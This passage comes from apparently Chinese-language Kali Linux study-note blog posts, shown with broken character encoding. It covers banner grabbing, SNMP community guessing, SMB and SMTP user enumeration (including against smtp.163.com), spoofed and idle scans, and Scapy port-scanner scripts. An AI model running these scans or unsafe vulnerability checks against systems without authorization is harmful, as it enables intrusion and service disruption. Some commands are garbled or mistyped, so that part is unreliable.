</ul>
<h4 id="5-æœåŠ¡æ‰«æ-Banner"><a href="#5-æœåŠ¡æ‰«æ-Banner" class="headerlink" title="5. æœåŠ¡æ‰«æ-Banner"></a>5. æœåŠ¡æ‰«æ-Banner</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -sTï¼ˆå®Œæ•´çš„TCPè¿æ¥ï¼‰ IPåœ°å€ -p ç«¯å£ --script=banner.nse</code></strong></li>
</ul>
<blockquote>
<pre><code>nmapæ‰«æè„šæœ¬ï¼š/usr/share/nmap/script</code></pre></blockquote>
<h4 id="6-æœåŠ¡æ‰«æ-Banner"><a href="#6-æœåŠ¡æ‰«æ-Banner" class="headerlink" title="6. æœåŠ¡æ‰«æ-Banner"></a>6. æœåŠ¡æ‰«æ-Banner</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šamap -Bï¼ˆä¸“é—¨å‘ç°æŒ‡å®šç«¯å£ä¸Šçš„bannerä¿¡æ¯ï¼‰ IPåœ°å€ ç«¯å£</code></strong></li>
</ul>
<h4 id="7-æœåŠ¡æ‰«æ-æœåŠ¡è¯†åˆ«"><a href="#7-æœåŠ¡æ‰«æ-æœåŠ¡è¯†åˆ«" class="headerlink" title="7. æœåŠ¡æ‰«æ-æœåŠ¡è¯†åˆ«"></a>7. æœåŠ¡æ‰«æ-æœåŠ¡è¯†åˆ«</h4><ul>
<li>Bannerä¿¡æ¯æŠ“å–èƒ½åŠ›æœ‰é™</li>
<li>nmapå“åº”ç‰¹å¾åˆ†æè¯†åˆ«æœåŠ¡<ul>
<li>å‘ç°ç³»åˆ—å¤æ‚çš„æ¢æµ‹</li>
<li>ä¾æ®å“åº”ç‰¹å¾signature</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnv -nv IPåœ°å€ ç«¯å£</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap IPåœ°å€ -p ç«¯å£</code></strong>-sVï¼ˆè¯†åˆ«ç«¯å£åé¢æœåŠ¡ï¼Œé€šè¿‡æŒ‡çº¹åŒ¹é…çš„æ–¹å¼ï¼Œä¸å•æ˜¯bannerä¿¡æ¯ï¼‰</li>
</ul>
<h4 id="8-æœåŠ¡æ‰«æ-æœåŠ¡è¯†åˆ«"><a href="#8-æœåŠ¡æ‰«æ-æœåŠ¡è¯†åˆ«" class="headerlink" title="8. æœåŠ¡æ‰«æ-æœåŠ¡è¯†åˆ«"></a>8. æœåŠ¡æ‰«æ-æœåŠ¡è¯†åˆ«</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šAmap</code></strong>ï¼ˆè¿˜æ˜¯åŸºäºbannerä¿¡æ¯è¿›è¡Œè¯†åˆ«ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šamap IPåœ°å€</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šamap IPåœ°å€ ç«¯å£å·</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šamap IPåœ°å€ ç«¯å£å· -q</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šamap IPåœ°å€ ç«¯å£å· -qb</code></strong></li>
</ul>
<h4 id="9-SNMPæ‰«æï¼ˆé€šä¿¡ï¼š101å’Œ102ï¼Œè¢«æŸ¥è¯¢çš„æœåŠ¡ç«¯ï¼š161ï¼Œå®¢æˆ·ç«¯ï¼š162-â†’-udpï¼‰"><a href="#9-SNMPæ‰«æï¼ˆé€šä¿¡ï¼š101å’Œ102ï¼Œè¢«æŸ¥è¯¢çš„æœåŠ¡ç«¯ï¼š161ï¼Œå®¢æˆ·ç«¯ï¼š162-â†’-udpï¼‰" class="headerlink" title="9. SNMPæ‰«æï¼ˆé€šä¿¡ï¼š101å’Œ102ï¼Œè¢«æŸ¥è¯¢çš„æœåŠ¡ç«¯ï¼š161ï¼Œå®¢æˆ·ç«¯ï¼š162 â†’ udpï¼‰"></a>9. SNMPæ‰«æï¼ˆé€šä¿¡ï¼š101å’Œ102ï¼Œè¢«æŸ¥è¯¢çš„æœåŠ¡ç«¯ï¼š161ï¼Œå®¢æˆ·ç«¯ï¼š162 â†’ udpï¼‰</h4><ul>
<li>snmpï¼ˆæ˜æ–‡ä¼ è¾“ï¼Œå¯è¢«å—…æ¢åˆ°ï¼‰<ul>
<li>ä¿¡æ¯çš„é‡‘çŸ¿ï¼ˆè®¾å¤‡çš„è¯¦ç»†å†…å®¹ï¼‰</li>
<li>ç»å¸¸è¢«é”™è¯¯é…ç½®ï¼ˆç‰¹å¾å­—ç¬¦ï¼Œcommunityï¼‰</li>
<li>public/private/mnager</li>
</ul>
</li>
<li>MIB Tree<ul>
<li>SNMP Management Information Baseï¼ˆMIBï¼‰</li>
<li>æ ‘å½¢çš„ç½‘ç»œè®¾å¤‡ç®¡ç†åŠŸèƒ½æ•°æ®åº“</li>
<li>1.3.6.1.4.1.77.1.2.25ï¼ˆOIDï¼‰</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šonesixtyone IPåœ°å€ public</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šonesixtyone -cï¼ˆå­—å…¸ï¼‰ dict.txt -iï¼ˆå¤šä¸ªä¸»æœºåˆ—è¡¨ï¼‰ host -o my.log -w 100</code></strong></li>
</ul>
<blockquote>
<pre><code>Window XPå®‰è£… â†’ ç¨‹åºè½¯ä»¶å®‰è£… â†’ æ·»åŠ ç»„ä»¶ â†’ ç®¡ç†å’Œç›‘è§†ï¼ˆæœ‰å¯èƒ½éœ€è¦å®‰è£…å…‰ç›˜ï¼‰
services.msc snmpæœåŠ¡ï¼Œå¯æ·»åŠ ä»£ç†ï¼Œé™·é˜±ï¼ˆsnmpä½œä¸ºå®¢æˆ·ç«¯ï¼‰ï¼Œé»˜è®¤å®‰è£…publicä½œä¸ºcommuityï¼Œç„¶åæ¥å—æ¥è‡ªä»»ä½•ä¸»æœºçš„SNMPæŸ¥è¯¢åŒ…</code></pre></blockquote>
<h4 id="10-SNMPæ‰«æ"><a href="#10-SNMPæ‰«æ" class="headerlink" title="10. SNMPæ‰«æ"></a>10. SNMPæ‰«æ</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsnmpwalk IPåœ°å€ -c public -vï¼ˆsnmpç‰ˆæœ¬ï¼‰ 2c</code></strong></li>
<li>ç”¨æˆ·<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsnmp -c publuc -v 2c IPåœ°å€ 1.3.6.1.4.1.77.1.2.25</code></strong>ï¼ˆMIB All IDï¼‰</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsnmpcheck -t</code></strong>ï¼ˆç›®æ ‡ä¸»æœºï¼‰ IPåœ°å€ï¼ˆé»˜è®¤æƒ…å†µä¸‹æ˜¯publicï¼Œå¯ä»¥ç”¨-cå»ä¿®æ”¹communityï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsnmpcheck -t IPåœ°å€ -c private -v 2</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsnmpcheck -t IPåœ°å€ -p agent w</code></strong>ï¼ˆæ£€æµ‹æ˜¯å¦æœ‰å¯å†™æƒé™ï¼‰</li>
</ul>
<blockquote>
<pre><code>SNMPç‰ˆæœ¬ï¼šv1ï¼Œv2cï¼Œv3ï¼ˆå¤§é‡å®‰å…¨æœºåˆ¶ï¼‰</code></pre></blockquote>
<h4 id="11-SMBæ‰«æ"><a href="#11-SMBæ‰«æ" class="headerlink" title="11. SMBæ‰«æ"></a>11. SMBæ‰«æ</h4><ul>
<li><p>Server Message Block åè®®</p>
<ul>
<li>å¾®è½¯å†å²ä¸Šå‡ºç°å®‰å…¨é—®é¢˜æœ€å¤šçš„åè®®</li>
<li>å®ç°å¤æ‚</li>
<li>é»˜è®¤å¼€æ”¾</li>
<li>æ–‡ä»¶å…±äº«</li>
<li>ç©ºä¼šè¯æœªèº«ä»½è®¤è¯è®¿é—®ï¼ˆSMB1ï¼‰</li>
</ul>
<ol>
<li>å¯†ç ç­–ç•¥</li>
<li>ç”¨æˆ·å</li>
<li>ç»„å</li>
<li>æœºå™¨å</li>
<li>ç”¨æˆ·ã€ç»„SIDï¼ˆAdminastratoråœ¨windowä¸­SIDé»˜è®¤ä¸º500ï¼‰</li>
</ol>
</li>
<li><p><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -vï¼ˆè¯¦ç»†ç»“æœï¼‰ -p 139,445 IPåœ°å€</code></strong>ï¼ˆè¾ƒç²—ç³™æ‰«æï¼Œè¿˜ä¸èƒ½åˆ¤æ–­winè¿˜æ˜¯linuxï¼‰</p>
</li>
<li><p><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap IPåœ°å€ -p139,445 --script=smb-os-discovery.nse</code></strong></p>
</li>
<li><p><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1ï¼ˆè¿›è¡Œä¸å®‰å…¨çš„æ‰«æï¼Œå¿«ï¼Œå‡†ç¡®ï¼Œå¯èƒ½ä¼šå®•æœºï¼‰ IPåœ°å€</code></strong> â–²2019.12.6 scriptæ— smb-check-vulnsè„šæœ¬</p>
</li>
<li><p><strong><code>ğŸ”ºå‘½ä»¤ï¼šnbtscan -r IPç½‘æ®µ/24ï¼ˆå¯ä»¥æ‰«å‡ºå…¶ä»–ç½‘æ®µçš„MACåœ°å€ï¼‰</code></strong>â–²2019.12.6æµ‹è¯•æš‚ä¸å¯æ‰«å‡º</p>
</li>
<li><p><strong><code>ğŸ”ºå‘½ä»¤ï¼šenum4linux -a IPåœ°å€</code></strong></p>
</li>
</ul>
<blockquote>
<pre><code>SMB Vulnsï¼ˆé’ˆå¯¹çš„æ˜¯Windowç³»ç»Ÿï¼‰
MS08-067ï¼Œa windpws RPC vulnerability
Confickerï¼Œan infection by the Conficker worm
Unnamed regsc Dosï¼Œa denial-of-service vulnerability I accidentally found in windows 2000
SMBv2 exploitï¼ˆCVE-2009-3103ï¼ŒMicrosoft Security Advisory 975497ï¼‰
MS06-025ï¼Œa windows Ras RPC service vulnerability
MS07-029ï¼Œa windows Dns Server RPC Service vulnerability
MS09-001ï¼Œa windows Code execution from remote</code></pre></blockquote>
<blockquote>
<pre><code>SMBæœåŠ¡ï¼š
&lt;00&gt;   Workstation Serviceï¼ˆå…±äº«åˆ«äººçš„æ–‡ä»¶ï¼‰
&lt;03&gt;   Messenger Service
&lt;20&gt;   File Server Serviceï¼ˆå¯¹åˆ«äººçš„æ–‡ä»¶å…±äº«ï¼‰
&lt;1e&gt;   Browser Service Electionsï¼ˆæµè§ˆå™¨æœåŠ¡ï¼‰
â–² windowä¸‹ä¸»æœºçš„SID  ç”¨æˆ·çš„RID
â–² linuxä¸‹ä¸»æœº uidï¼Œgidï¼Œgroups</code></pre></blockquote>
<h4 id="12-SMTPæ‰«æï¼ˆå‘ç°ç›®æ ‡ç³»ç»Ÿçš„é‚®ä»¶è´¦å·ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¢«åŠ¨ä¿¡æ¯æ”¶é›†ï¼‰"><a href="#12-SMTPæ‰«æï¼ˆå‘ç°ç›®æ ‡ç³»ç»Ÿçš„é‚®ä»¶è´¦å·ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¢«åŠ¨ä¿¡æ¯æ”¶é›†ï¼‰" class="headerlink" title="12. SMTPæ‰«æï¼ˆå‘ç°ç›®æ ‡ç³»ç»Ÿçš„é‚®ä»¶è´¦å·ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¢«åŠ¨ä¿¡æ¯æ”¶é›†ï¼‰"></a>12. SMTPæ‰«æï¼ˆå‘ç°ç›®æ ‡ç³»ç»Ÿçš„é‚®ä»¶è´¦å·ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¢«åŠ¨ä¿¡æ¯æ”¶é›†ï¼‰</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnc -nv IPåœ°å€ ç«¯å£</code></strong><ul>
<li>VRFY rootï¼ˆç¡®è®¤æœ‰æ— rootè´¦å·ï¼‰</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap smtp.163.com -p 25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods=VRFY</code></strong>ï¼ˆåé¢å¯åŠ å‚æ•°æŒ‡å®šå­—å…¸æ–‡ä»¶ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap smtp.163.com -p 25 --script=smtp-open-relay.nse --script=smtp-user-enum -M VRFY -Uï¼ˆæŒ‡å®šå­—å…¸ï¼‰ user.txt -t IPåœ°å€</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./smtp.py &lt;username&gt;</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage: smtp.py &lt;username&gt;&quot;</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&quot;IPåœ°å€&quot;,ç«¯å£))</span><br><span class="line">banner=s.recv(4096)</span><br><span class="line">print banner+&quot;aaaaa&quot;</span><br><span class="line">s.send(&apos;VRFY&apos;+sys.argv[1]+&apos;\r\n&apos;)</span><br><span class="line">result=s.recv(4096)</span><br><span class="line">print result</span><br><span class="line">s.close</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>é‚®ä»¶æœåŠ¡å™¨å¼€æ”¾ä¸­ç»§ï¼Œå…è®¸å…¶ä»–äººç”¨é‚®ä»¶æœåŠ¡å™¨å¯¹å…¶ä»–äººå‘é‚®ä»¶ï¼Œæˆä¸ºè‚‰é¸¡</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%85%AB)%EF%BC%9A%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F--TCP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%85%AB)%EF%BC%9A%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F--TCP/" itemprop="url">Kali Linuxç¬”è®°(åå…«)ï¼šç«¯å£æ‰«æ--TCP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
                2019-12-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  1.6k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  8 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-ç«¯å£æ‰«æï¼ˆTCPï¼‰"><a href="#1-ç«¯å£æ‰«æï¼ˆTCPï¼‰" class="headerlink" title="1. ç«¯å£æ‰«æï¼ˆTCPï¼‰"></a>1. ç«¯å£æ‰«æï¼ˆTCPï¼‰</h4><ul>
<li><p>TCPç«¯å£æ‰«æï¼ˆSYNâ€“SYN/ACKâ€“ACKï¼‰</p>
<ul>
<li>åŸºäºè¿æ¥çš„åè®®</li>
<li>ä¸‰æ¬¡æ¡æ‰‹ï¼ˆACKåŒ…è¿æ¥ï¼‰</li>
<li>éšè”½æ‰«æï¼ˆéšè—ä¸ç›®æ ‡è¿›ç¨‹çš„ä¼šè¯ï¼‰â€“SYNï¼ˆå¼€æ”¾ â†’SYN/ACKï¼Œä¸å¼€æ”¾ â†’ RSTï¼‰</li>
</ul>
<ol>
<li>ä¸å»ºç«‹å®Œæ•´è¿æ¥ï¼ˆSYNï¼ˆå¼€æ”¾ â†’SYN/ACKï¼Œä¸å¼€æ”¾ â†’ RSTï¼‰ï¼‰</li>
<li>åº”ç”¨æ—¥å¿—ä¸è®°å½•æ‰«æè¡Œä¸ºâ€“éšè”½ï¼ˆä½†å®¡è®¡ç½‘ç»œå±‚ï¼Œè¿˜æ˜¯å¯ä»¥å‘ç°ï¼‰</li>
</ol>
<ul>
<li>åƒµå°¸æ‰«æï¼ˆå‡ ä¹ä¸å’Œç›®æ ‡è¿›ç¨‹å°è¯•ä¼šè¯ï¼‰</li>
</ul>
<ol>
<li>æåº¦éšè”½</li>
<li>å®æ–½æ¡ä»¶è‹›åˆ»</li>
<li>å¯ä¼ªé€ æºåœ°å€ï¼ˆâ–²æ‰«æè€…ä¸ç›®æ ‡ä¸»æœºå¿…é¡»å¯ä»¥å®ç°åœ°å€ä¼ªé€ ï¼‰</li>
<li>é€‰æ‹©åƒµå°¸æœºï¼ˆâ–²å¿…é¡»è¦æœ‰ï¼Œç½‘ç»œä¸­é—²ç½®çš„æœºå­ï¼Œä¸åŒäºåƒµå°¸ç½‘ç»œçš„æœºå­ï¼‰<ul>
<li>é—²ç½®ç³»ç»Ÿ</li>
<li>ç³»ç»Ÿä½¿ç”¨é€’å¢çš„IPIDï¼šï¼ˆ1ï¼‰ä¸èƒ½ä¸º0 ï¼ˆ2ï¼‰ä¸èƒ½ä¸ºéšæœº</li>
</ul>
</li>
</ol>
<ul>
<li>å…¨è¿æ¥æ‰«æï¼ˆä¸‰æ¬¡æ¡æ‰‹è¿æ¥ï¼‰</li>
<li>æ‰€æœ‰çš„TCPæ‰«ææ–¹å¼éƒ½æ˜¯åŸºäºä¸‰æ¬¡æ¡æ‰‹çš„å˜åŒ–æ¥åˆ¤æ–­ç›®æ ‡ç«¯å£çŠ¶æ€</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>IPID:IPæŠ¥å¤´é‡Œé¢çš„Identificationå­—æ®µ
1.åƒµå°¸æ‰«æè¿‡ç¨‹ï¼ˆç«¯å£å¼€æ”¾ï¼‰ï¼š
ï¼ˆ1ï¼‰Scannerã€SYN/ACKã€‘ -- Zombieã€RST IPID=Xã€‘
ï¼ˆ2ï¼‰Scannerã€SYN IPSRC=zombieã€‘ -- targetã€SYN/ACKã€‘ -- Zombieã€RST IPID=x+1,(åƒµå°¸æœºéœ€è¦è¶³å¤Ÿç©ºé—²)ã€‘
ï¼ˆ3ï¼‰Scannerã€SYN/ACKã€‘ -- Zombieã€RST IPID=x+2ã€‘
2.åƒµå°¸æ‰«æè¿›ç¨‹ï¼ˆç«¯å£æœªå¼€æ”¾ï¼‰ï¼š
ï¼ˆ1ï¼‰Scannerã€SYN/ACKã€‘ -- Zombieã€RST IPID=Xã€‘
ï¼ˆ2ï¼‰Scannerã€SYN IPSRC=zombieã€‘ -- targetã€RSTã€‘ -- Zombie
ï¼ˆ3ï¼‰Scannerã€SYN/ACKã€‘ -- Zombieã€RST IPID=x+1ã€‘</code></pre></blockquote>
<h4 id="2-éšè”½ç«¯å£æ‰«æ"><a href="#2-éšè”½ç«¯å£æ‰«æ" class="headerlink" title="2. éšè”½ç«¯å£æ‰«æ"></a>2. éšè”½ç«¯å£æ‰«æ</h4><ul>
<li>synâ€“syn/ackâ€“rstï¼ˆæœ¬æœºæ“ä½œç³»ç»Ÿå†…æ ¸äº§ç”Ÿçš„ï¼‰</li>
<li>Scapy<ul>
<li>sr1(IP(dst=â€IPåœ°å€â€)/TCP(dport=80,flags=â€Sâ€),timeout=1,verbose=0)</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./syn_scan.py ç›®æ ‡IPåœ°å€ èµ·å§‹ç«¯å£ ç»“æŸç«¯å£</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=4:</span><br><span class="line">    print &quot;Usage - ./syn_scan.py [Target IP] [First IP] [Last IP] &quot;</span><br><span class="line">    print &quot;Example - ./syn_scan.py 192.168.100.1 1 200&quot;</span><br><span class="line">    print &quot;Example will perform a TCP SYN scan of the 192.168.100.0/24 range&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[1]</span><br><span class="line">start=int(sys.argv[2])</span><br><span class="line">end=int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">for port in range(start,end):</span><br><span class="line">    a=sr1(IP(dst=ip)/TCP(dport=port),timeout=1,verbose=0)</span><br><span class="line">    if a==None:</span><br><span class="line">      pass</span><br><span class="line">    else:</span><br><span class="line">      if int(a[TCP].flags)==18:</span><br><span class="line">        print port</span><br><span class="line">      else:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>æ­£å¸¸æƒ…å†µä¸‹ï¼š
ç«¯å£å¼€æ”¾ï¼šsyn--syn/ack
ç«¯å£æœªå¼€æ”¾ï¼šsyn--rst/ack</code></pre></blockquote>
<h4 id="3-éšè”½ç«¯å£æ‰«æ"><a href="#3-éšè”½ç«¯å£æ‰«æ" class="headerlink" title="3. éšè”½ç«¯å£æ‰«æ"></a>3. éšè”½ç«¯å£æ‰«æ</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -sS IPåœ°å€ -p 80,21,25,110,443</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -sS IPåœ°å€ -p 1-65535 --open</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -sS IPåœ°å€ --open</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -sS -iL iplist.txt -p 80,21,22,23</code></strong></li>
</ul>
<h4 id="4-éšè”½ç«¯å£æ‰«æ"><a href="#4-éšè”½ç«¯å£æ‰«æ" class="headerlink" title="4. éšè”½ç«¯å£æ‰«æ"></a>4. éšè”½ç«¯å£æ‰«æ</h4><ul>
<li>hping3ï¼ˆå‘åŒ…ä¹ æƒ¯æ˜¯é¡ºåºç«¯å£ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šhping3 IPåœ°å€ --scan 80 -S</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šhping3 IPåœ°å€ --scan 80,21,25,443 -S</code></strong>ï¼ˆsynåŒ…ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šhping3 IPåœ°å€ --scan 0-65535 -S</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šhping3 -c 10 -S --spoofï¼ˆä¼ªé€ æºåœ°å€ï¼‰ IPåœ°å€ -p ++1ï¼ˆç«¯å£é€’å¢ï¼‰ IPåœ°å€</code></strong></li>
</ul>
<h4 id="5-å…¨è¿æ¥ç«¯å£æ‰«æ"><a href="#5-å…¨è¿æ¥ç«¯å£æ‰«æ" class="headerlink" title="5. å…¨è¿æ¥ç«¯å£æ‰«æ"></a>5. å…¨è¿æ¥ç«¯å£æ‰«æ</h4><ul>
<li>Scapyï¼ˆå®¹æ˜“è§¦å‘ç›®æ ‡ä¸»æœºçš„æŠ¥è­¦ç³»ç»Ÿï¼‰<ul>
<li>synæ‰«æä¸éœ€è¦raw packets</li>
<li>å†…æ ¸è®¤ä¸ºsyn/ackæ˜¯éæ³•åŒ…ï¼Œç›´æ¥å‘rstç»ˆæ–­è¿æ¥</li>
<li>å…¨è¿æ¥æ‰«æå¯¹scapyæ¯”è¾ƒå›°éš¾</li>
</ul>
</li>
<li>sr1(IP(dst=â€IPåœ°å€â€)/TCP(dport=22,flags=â€Sâ€))</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./tcp_scan1.pyï¼ˆä»£ç å†…æŒ‡å®šIPåœ°å€ï¼‰</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy,runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import*</span><br><span class="line"></span><br><span class="line">response=sr1(IP(dst=&quot;IPåœ°å€&quot;)/TCP(dport=80,flags=&quot;S&quot;))</span><br><span class="line">reply=sr1(IP(dst=&quot;IPåœ°å€&quot;)/TCP(dport=80,flags=&quot;A&quot;,ack=(response[TCP].seq+1)))</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./tcp_scan2.pyï¼ˆä»£ç å†…æŒ‡å®šIPåœ°å€ï¼‰</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy,runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import*</span><br><span class="line"></span><br><span class="line">SYN=IP(dst=&quot;IPåœ°å€&quot;)/TCP(dport=25,flags=&quot;S&quot;)</span><br><span class="line"></span><br><span class="line">print &quot;--SENT--&quot;</span><br><span class="line">SYN.display()</span><br><span class="line"></span><br><span class="line">print &quot;\n\n--RECEIVED--&quot;</span><br><span class="line">response=sr1(SYN,timeout=1,verbose=0)</span><br><span class="line">response.display()</span><br><span class="line"></span><br><span class="line">if int(response[TCP].flags)==18:</span><br><span class="line">    print &quot;\n\n--SENT--&quot;</span><br><span class="line">    A=IP(dst=&quot;IPåœ°å€&quot;)/TCP(dport=25,flags=&quot;A&quot;,ack=(response[TCP].seq+1))</span><br><span class="line">    A.display()</span><br><span class="line">    print &quot;\n\n--RECEIVED--&quot;</span><br><span class="line">    response2=sr1(A,timeout=1,verbose=0)</span><br><span class="line">    response2.display()</span><br><span class="line">else:</span><br><span class="line">    print &quot;SYN-ACK not returned&quot;</span><br></pre></td></tr></table></figure>

<ul>
